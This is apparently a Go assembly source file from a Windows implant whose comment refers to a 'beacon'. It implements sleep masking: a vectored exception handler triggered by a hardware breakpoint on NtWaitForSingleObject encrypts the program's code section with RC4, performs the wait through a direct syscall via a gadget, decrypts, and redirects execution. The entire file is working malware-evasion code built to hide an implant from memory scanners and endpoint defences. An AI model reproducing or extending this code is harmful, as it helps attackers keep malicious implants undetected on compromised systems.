//go:build windows && amd64
#include "textflag.h"

// hwbpHandleBreakpoint — called from the VEH. Encrypts .text and
// stack, performs the wait via direct syscall, decrypts, and
// adjusts the CONTEXT's RIP so the thread resumes after the
// breakpoint address.
//
// Args:
//   exceptionInfo uintptr — pointer to EXCEPTION_POINTERS
TEXT ·hwbpHandleBreakpoint(SB), NOSPLIT, $0-8
    MOVQ  exceptionInfo+0(FP), AX

    // EXCEPTION_POINTERS[1] = ContextRecord.
    MOVQ  0x08(AX), BX

    // Load hwbpCtx base address.
    LEAQ  ·hwbpCtx(SB), R13

    // --- Encrypt .text ---
    MOVQ  0x20(R13), CX      // textBase
    MOVQ  0x28(R13), DX      // textSize
    LEAQ  0x10(R13), R8      // &key
    MOVQ  0x40(R13), R9      // rc4Addr
    CALL  ·callSystemFunction032Native(SB)

    // --- Encrypt stack ---
    // Skipped when stackSize is zero. currentStackRegion returns
    // (0, 0) because Go goroutine stack bounds are not exposed to
    // user code, and encrypting the OS thread stack would hide
    // nothing the beacon cares about. See the comment on
    // currentStackRegion in sleepmask_stack_windows.go.
    MOVQ  0x38(R13), DX      // stackSize
    TESTQ DX, DX
    JZ    hwbp_skip_enc_stack
    MOVQ  0x30(R13), CX      // stackBase
    LEAQ  0x10(R13), R8
    MOVQ  0x40(R13), R9
    CALL  ·callSystemFunction032Native(SB)
hwbp_skip_enc_stack:

    // --- Direct syscall: NtWaitForSingleObject ---
    // Relative timeout: -(durationMs * 10000) as LARGE_INTEGER.
    MOVL  0x08(R13), AX      // durationMs (zero-extended into RAX)
    IMULQ $10000, AX
    NEGQ  AX
    SUBQ  $16, SP
    MOVQ  AX, 0(SP)

    MOVQ  $0x04, AX          // SSN for NtWaitForSingleObject
    MOVQ  $-1, CX            // CurrentProcess pseudo-handle
    XORQ  DX, DX             // alertable = FALSE
    LEAQ  0(SP), R8          // arg3 = &timeout
    MOVQ  ·syscallGadgetAddr(SB), R10
    CALL  R10
    ADDQ  $16, SP

    // --- Decrypt stack ---
    MOVQ  0x38(R13), DX
    TESTQ DX, DX
    JZ    hwbp_skip_dec_stack
    MOVQ  0x30(R13), CX
    LEAQ  0x10(R13), R8
    MOVQ  0x40(R13), R9
    CALL  ·callSystemFunction032Native(SB)
hwbp_skip_dec_stack:

    // --- Decrypt .text ---
    MOVQ  0x20(R13), CX
    MOVQ  0x28(R13), DX
    LEAQ  0x10(R13), R8
    MOVQ  0x40(R13), R9
    CALL  ·callSystemFunction032Native(SB)

    // --- Resume at the return address of the original call ---
    // The #DB fired before the first instruction of
    // NtWaitForSingleObject. We have already performed the wait
    // via direct syscall, so we must skip the entire original
    // call. The return address pushed by the Go-side CALL is at
    // [RSP] in the interrupted context.
    MOVQ  0x98(BX), CX       // CONTEXT.Rsp
    MOVQ  0(CX), CX          // [RSP] = return address
    MOVQ  CX, 0xF8(BX)       // CONTEXT.Rip = return address

    RET

// ---- Native VEH ----
//
// Registered with AddVectoredExceptionHandler as a raw function
// pointer, not a Go callback. The kernel calls this synchronously
// on the faulting thread. It must not enter the Go runtime.
//
// Windows x64 ABI: the first argument (EXCEPTION_POINTERS*) is in
// RCX. The return value (LONG) is in RAX.
//
//   EXCEPTION_POINTERS { EXCEPTION_RECORD*; CONTEXT*; }
//   EXCEPTION_RECORD   { DWORD Code; DWORD Flags;
//                        EXCEPTION_RECORD* Nested;
//                        PVOID Address; ... }
//
// Return values:
//   EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF (resume at CONTEXT)
//   EXCEPTION_CONTINUE_SEARCH    = 0          (pass to next handler)
TEXT ·hwbpVEHNative(SB), NOSPLIT, $0-0
    PUSHQ BX
    PUSHQ R12
    PUSHQ R13

    MOVQ  CX, R12               // R12 = EXCEPTION_POINTERS*
    MOVQ  0(R12), R13           // R13 = EXCEPTION_RECORD*

    // ExceptionCode == STATUS_SINGLE_STEP ?
    //
    // The comparison is done register-to-register because
    // CMPL's immediate is treated as a signed 32-bit value
    // and 0x80000004 is above the signed maximum. R10 is a
    // caller-saved scratch register and is not live across
    // the CALL below, so it is safe to use here.
    MOVL  0(R13), AX
    MOVL  $0x80000004, R10
    CMPL  R10, AX
    JNE   hwbp_veh_continue_search

    // ExceptionAddress == hwbpCtx.ntWaitAddr ?
    MOVQ  16(R13), AX
    LEAQ  ·hwbpCtx(SB), BX
    CMPQ  0(BX), AX
    JNE   hwbp_veh_continue_search

    // Match: encrypt, wait, decrypt, adjust RIP.
    MOVQ  R12, CX
    CALL  ·hwbpHandleBreakpoint(SB)

    MOVQ  $0xFFFFFFFF, AX       // EXCEPTION_CONTINUE_EXECUTION
    JMP   hwbp_veh_exit

hwbp_veh_continue_search:
    XORQ  AX, AX                // EXCEPTION_CONTINUE_SEARCH

hwbp_veh_exit:
    POPQ  R13
    POPQ  R12
    POPQ  BX
    RET

// ---- PC accessor ----
//
// Returns the raw PC of hwbpVEHNative so Go can pass it to
// AddVectoredExceptionHandler without a syscall.NewCallback
// trampoline.
TEXT ·hwbpVEHNativePC(SB), NOSPLIT, $0-8
    LEAQ  ·hwbpVEHNative(SB), AX
    MOVQ  AX, ret+0(FP)
    RET
